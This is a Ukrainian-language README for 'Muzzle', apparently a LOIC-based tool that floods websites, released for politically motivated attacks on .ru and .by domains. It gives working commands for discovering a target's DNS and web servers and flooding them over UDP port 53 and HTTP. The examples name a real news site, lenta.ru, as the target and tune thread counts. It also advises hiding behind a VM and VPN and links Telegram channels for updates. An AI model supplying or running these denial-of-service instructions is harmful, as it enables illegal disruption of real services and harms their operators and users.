# Чому Muzzle?

Сучасні інструменти для створення тиску на сайти мають деяки або усі проблеми, особливо для недосвідчених користувачей:

1. Декілька компонент які мають буті встановлені та налаштовані (python etc.)
2. Багато спеціалізованих параметрів котрі не є зрозумілими для новачків.
3. Одна ip адреса тиску при тому що сучасні системи мають декілька веб- та днс серверів.

# Рішення
Muzzle - це наша відповідь.
1. Простий у використанні інструмент на основі ЛОІСу.
2. Виявляє **всі** DNS та Web сервери пов'язані з певним доменом та створює їм стресові умови.

Програма дозволяє тиск тільки на .ru та .by домени. Ми допомагаемо браттям, але нікому іншому.

# Встановлення та налаштування

Любі інструменти такого роду мають встановлюватись на віртуальну машину для безпеки.

Користуйтесь VPN. Наприклад https://clearvpn.com пропонує безкоштовний аккаунт на рік при використанні промо коду SAVEUKRAINE.

1. Скачайте останню версію інструмента та витягніть з архіву. 
2. Обирайте ціль та запускайте прогу.

# Приклади команд
muzzle sniff -d lenta.ru
> Виявити та роздрукувати DNS та Web сервери пов'язані з доменом lenta.ru.

muzzle dns-flood -d lenta.ru
muzzle dns-flood -d lenta.ru -t 25
> Тиск на всі DNS сервери що належать lenta.ru по UDP порту 53. 
> Кількість одночасних з'єднань до кожного сервера (потоків) - параметр -t, за змовчуванням - 40.
> Зростання показника Requested - це добре.

muzzle http-flood -d lenta.ru

muzzle http-flood -d lenta.ru -t 35
> Тиск на всі Web сервери що належать lenta.ru по TCP порту 80 (HTTP).  
> Кількість одночасних з'єднань до кожного сервера (потоків) - параметр -t, за змовчуванням - 40.
> Зростання показника Downloaded або принаймні Requested - це добре.

muzzle help 
> Перелік команд.

muzzle version
> Роздрук версії програми.

Повідомлення про нові версії: https://t.me/getmuzzle

Питання та пропозиції: https://t.me/+guqhldDxOMw4YWUx
